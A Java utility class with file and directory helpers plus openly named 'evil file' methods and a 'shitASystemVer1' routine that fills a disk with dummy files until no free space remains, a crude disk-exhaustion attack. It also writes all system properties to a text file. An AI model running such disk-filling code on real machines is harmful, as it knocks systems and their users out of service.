import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Properties;

public class Library {
    static final String SEP = File.separator;

    /**
     * This method creates a directory by giving its path
     *
     * @param dirPath is path of which a directory will be created
     * @return File directory
     */
    static File createDir(String dirPath) {
        File newDir = new File(dirPath);
        if (!newDir.exists()) {
            if (newDir.mkdir()) System.out.println("Directory \"" + newDir.getPath() + "\" created successfully");
            else System.out.println("Failed to create a directory");
        } else System.out.println("Directory already exists");
        return newDir;
    }

    /**
     * This method deletes a directory or a file
     * It is better to use this one 'coz it can delete either
     * directory (folder) or just a normal file
     *
     * @param file (File) is a directory or a file
     */
    static void deleteFile(File file) {
        if (file.exists() && file.isDirectory()) { //exists and directory
            try {
                String[] entries = file.list();
                System.out.println("Directory \"" + file.getPath() + SEP + "\" contains: ");
                System.out.println(Arrays.toString(entries));
                for (String fileName : entries) {
                    File currentFile = new File(file.getPath(), fileName);
                    System.out.println("file to delete: " + fileName);

                    if (currentFile.isDirectory()) { //if file is a directory
                        deleteDirectory(currentFile.getPath()); //recursive call
                    }
                    currentFile.delete();
                    if (!currentFile.exists() && !currentFile.isDirectory())
                        System.out.println("deleted: [" + currentFile.toString() + "]");
                }
                file.delete();
                if (!file.exists()) {
                    System.out.println("Directory \"" + file.getName() + "\" was deleted successfully");
                } else System.out.println("Directory \"" + file.getName() + "\" can not be deleted");
            } catch (Exception e) {
                System.out.println("Deletion is not possible");
                System.out.println(e.getMessage());
            }
        }//end of 1st if(dir exists and directory) statement
        else if (file.exists() && !file.isDirectory()) { //if dir is a file and exists
            file.delete();
            System.out.println("deleted: [" + file.toString() + "]");
        } else System.out.println("Directory \"" + file.getName() + "\" does not exist");
    }//end of method


    /**
     * This method deletes a only a directory
     *
     * @param dirPath (String) is path to directory to be deleted
     */
    static void deleteDirectory(String dirPath) {
        File dir = new File(dirPath);
        if (dir.exists()) {
//            System.out.println("Base directory \"" + dir.getName() + "\" already exists");
            try {
                String[] entries = dir.list();
                System.out.println("Directory \"" + dir.getPath() + SEP + "\" contains: ");
                System.out.println(Arrays.toString(entries));
                for (String fileName : entries) {
                    File currentFile = new File(dir.getPath(), fileName);
                    System.out.println("file to delete: " + fileName);
                    if (currentFile.isDirectory()) {
                        deleteDirectory(currentFile.getPath());
                    }
                    currentFile.delete();
                    if (!currentFile.exists() && !currentFile.isDirectory())
                        System.out.println("deleted: [" + currentFile.toString() + "]");
                }
                dir.delete();
                if (!dir.exists()) {
                    System.out.println("Directory \"" + dir.getName() + "\" was deleted successfully");
                } else System.out.println("Directory \"" + dir.getName() + "\" can not be deleted");
            } catch (Exception e) {
                System.out.println("Deletion is not possible");
                System.out.println(e.getMessage());
            }
        } else System.out.println("Directory \"" + dir.getName() + "\" does not exist");
    }


    /**
     * This method creates a so-called "evil file" that
     * just a dummy file with size ~ 67 Mb
     *
     * @param evilDir a (File) directory to
     *                where an evil file should be created
     * @return (File) an evil file
     * @throws IOException is something goes wrong
     */
    static File createEvilFile(File evilDir) throws IOException {
        String filePath = evilDir.getPath();
        String fileName = "Pumpkin.pmk";
        File evilFile = new File(filePath, fileName);
//        RandomAccessFile rafile;
//        rafile = new RandomAccessFile(evilFile, "rw");
        evilFile.createNewFile();
        int bigVal = Integer.MAX_VALUE / 32; //change this to change a file size
        byte[] byteData = new byte[bigVal];
        FileOutputStream fos = new FileOutputStream(evilFile);
        try {
            fos.write(byteData);
        } catch (Exception e) {
            e.getMessage();
        } finally {
            fos.close();
        }
        return evilFile;
    }

    /**
     * Method createEvilFile creates a dummy file with specified:
     * path, name with extension, and size
     *
     * @param evilDir               directory where the dummy file to be created
     * @param fileNameWithExtension dummy file name with extension
     * @param size                  dummy file size
     * @return File dummy so called "evil file"
     * @throws IOException
     */
    static File createEvilFile(File evilDir, String fileNameWithExtension, long size) throws IOException {
        String filePath = evilDir.getPath();
        File evilFile = new File(filePath, fileNameWithExtension);
        evilFile.createNewFile();
        byte[] byteData = new byte[(int) size];
        FileOutputStream fos = new FileOutputStream(evilFile);
        try {
            fos.write(byteData);
        } catch (Exception e) {
            e.getMessage();
        } finally {
            fos.close();
        }
        return evilFile;
    }

    static File createEvilFile(String path, String fileNameWithExtension, long size) throws IOException {
        File evilFile = new File(path, fileNameWithExtension);
        evilFile.createNewFile();
        byte[] byteData = new byte[(int) size];
        FileOutputStream fos = new FileOutputStream(evilFile);
        try {
            fos.write(byteData);
        } catch (Exception e) {
            e.getMessage();
        } finally {
            fos.close();
        }
        return evilFile;
    }

    /**
     * Method calculateFileSize returns size of a file or folder.
     * Not very accurate and fast but quite simple.
     *
     * @param file is file or folder which size is to be calculated
     * @return long size in bytes
     */
    static long calculateFileSize(File file) {
        long size = 0;
        File[] fileRar = file.listFiles();

        if (!file.isDirectory()) {
            return size = file.length();
        }
        assert fileRar != null;
        for (File tmp : fileRar) {
            if (!tmp.isDirectory()) {
                size += tmp.length();
            } else {
                size += calculateFileSize(tmp);
            }
        }
        return size;
    }


    /**
     * Method parseCalculatedSize converts byte size into a
     * more comprehensive output for humans
     *
     * @param size (long) previously calculated size in bytes.
     * @return String output
     */
    static String parseCalculatedSize(long size) {
        final int CONVERT_RATE = 1024;

        long bytes = size;
        long kbytes = 0L;
        long mbytes = 0L;
        long gbytes = 0L;

        if (bytes == 0) {
            return "0";
        }
        if (bytes >= CONVERT_RATE) {
            kbytes = bytes / CONVERT_RATE;
            bytes = bytes % CONVERT_RATE;
        }
        if (kbytes >= CONVERT_RATE) {
            mbytes = kbytes / CONVERT_RATE;
            kbytes = kbytes % CONVERT_RATE;
        }
        if (mbytes >= CONVERT_RATE) {
            gbytes = mbytes / CONVERT_RATE;
            mbytes = mbytes % CONVERT_RATE;
        }
        return "[" + gbytes + " Gb, " + mbytes + " Mb, "
                + kbytes + " Kb, " + bytes + " bytes" + "]";
    }

    /**
     * Method shitASystemVer1 implements the 1st way to shit the OS up.
     * It's gist is: create a directory and while there is a free space
     * bake dummy files.
     *
     * @param dirName   (String) is name/path of a directory for dummies
     * @param freeSpace //how much free space does the disk have
     * @throws IOException probably if file can not be created
     */
    static void shitASystemVer1(String dirName, long freeSpace) throws IOException {
        System.out.println("FreeSpace: " + Library.parseCalculatedSize(freeSpace));

        File dir = Library.createDir(dirName);

        File ef = Library.createEvilFile(dir);
        MyFile mf = new MyFile(ef);
        long currentFreeSpace = Library.calculateFileSize(dir);
        while (currentFreeSpace < freeSpace) {
            long difference = freeSpace - currentFreeSpace;
            if ((difference) < 1024 * 1024 * 65) { //if there (space < 65 Mb) left
                createEvilFile(dir, "coup_de_grace.cdg", difference);
                break;
            }
            mf.createCopyWithContaining();
            currentFreeSpace = Library.calculateFileSize(dir);
        }
        System.out.println("-------");
        System.out.println("Overall size of the dir \"" + dir.getPath() + "\" is: " + "\n"
                + Library.parseCalculatedSize(Library.calculateFileSize(dir)));

    }//end of shitASystemVer1 method

    static void generatePropsFile() throws IOException {
        Properties props = System.getProperties();
        String ps = props.toString();
        String[] rar = ps.split(",");
        File spFile = new File(".", "SysProps" + "." + "txt");
        FileOutputStream fos = new FileOutputStream(spFile);
        for (String s : rar) {
            System.out.println(s + " ");
            s += System.lineSeparator();
            byte[] sb = s.getBytes();
            fos.write(sb);
        }
        fos.close();
    }


    /**
     * Method fileDirParser used for retrieving all
     * normal files that stored inside a directory
     * @param file is a file or directory that should be parsed
     *             for files that it contains
     * @return ArrayList<File> collection that stores
     * all discovered files
     * @throws IOException
     */
    static ArrayList<File> fileDirParser(File file) throws IOException {
        ArrayList<File> fileDirParser = new ArrayList<>();
        fpRec(fileDirParser, file); //recursive worker method invocation
        return fileDirParser;
    }

    //helper method for fileDirParser()
    private static void fpRec(ArrayList<File> fileArrayList, File file) throws IOException {
        if (!file.isDirectory()) {
            System.out.println("Processing !dir: " + file.getAbsolutePath());
            fileArrayList.add(file);
        } else {
            File[] fileRar = file.listFiles();
            assert fileRar != null;
            for (File tmp : fileRar) {
                if (!tmp.isDirectory()) {
                    System.out.println("Processing nested !dir: " + tmp.getAbsolutePath());
                    fileArrayList.add(tmp);
                } else {
                    System.out.println("Processing dir: " + tmp.getAbsolutePath());
                    fpRec(fileArrayList, tmp);
                }
            }
        }
    }//end of helper method


    /**
     * This method parses a directory and finds files and creates of them MyFile objects
     * then stores them in ArrayList instance
     * @param file directory or a normal file that has to be parced
     * @return ArrayList<MyFile> with found files in MyFile shells
     * @throws IOException
     */
    static ArrayList<MyFile> myFileDirParser(File file) throws IOException {
        ArrayList<MyFile> myFileArrayList = new ArrayList<>();
        mfpRec(myFileArrayList, file); //recursive worker method invocation
        return myFileArrayList;
    }

    //helper method for myFileDirParser()
    private static void mfpRec(ArrayList<MyFile> myFileArrayList, File file) throws IOException {
        if (!file.isDirectory()) {
            System.out.println("Processing !dir: " + file.getAbsolutePath());
            MyFile mf = new MyFile(file);
            myFileArrayList.add(mf);
        } else {
            File[] fileRar = file.listFiles();
            assert fileRar != null;
            for (File tmp : fileRar) {
                if (!tmp.isDirectory()) {
                    System.out.println("Processing nested !dir: " + tmp.getAbsolutePath());
                    MyFile mf = new MyFile(tmp);
                    myFileArrayList.add(mf);
                } else {
                    System.out.println("Processing dir: " + tmp.getAbsolutePath());
                    mfpRec(myFileArrayList, tmp);
                }
            }
        }
    }


}//end of class Library
